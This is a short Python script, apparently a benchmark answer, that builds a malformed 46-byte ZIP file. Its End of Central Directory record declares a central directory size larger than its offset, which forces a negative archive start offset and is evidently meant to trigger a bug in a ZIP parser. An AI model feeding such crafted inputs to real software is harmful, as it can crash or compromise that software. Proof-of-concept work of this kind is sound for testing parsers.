import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        prefix = b"\x00" * 24  # Ensures EOCD starts at offset 24 in a 46-byte file
        eocd = struct.pack(
            "<4sHHHHIIH",
            b"PK\x05\x06",  # End of Central Directory signature
            0,              # number of this disk
            0,              # disk where central directory starts
            1,              # number of central directory records on this disk
            1,              # total number of central directory records
            25,             # size of central directory (forces negative archive start offset: 24 - 25 = -1)
            0,              # offset of start of central directory
            0               # ZIP comment length
        )
        return prefix + eocd